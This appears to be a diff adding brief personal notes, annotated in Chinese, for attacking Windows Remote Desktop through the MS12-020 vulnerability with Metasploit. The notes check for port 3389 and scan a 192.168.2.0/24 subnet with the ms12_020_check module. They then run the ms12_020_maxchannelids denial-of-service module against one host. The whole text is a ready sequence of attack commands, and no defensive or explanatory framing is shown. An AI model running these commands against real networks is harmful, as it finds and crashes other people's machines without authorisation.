@@ -1,0 +1,15 @@
+netstat -an | find "3389"
+基于3389端口漏洞
+
+search ms12_020
+use auxiliary/scanner/rdp/ms12_020_check  查询网段内可利用的ms12_020漏洞的主机
+show options
+set RHOSTS 192.168.2.0/24
+set THREADS 50
+exploit
+back 返回
+
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+show options
+set RHOST 192.168.2.132
+run
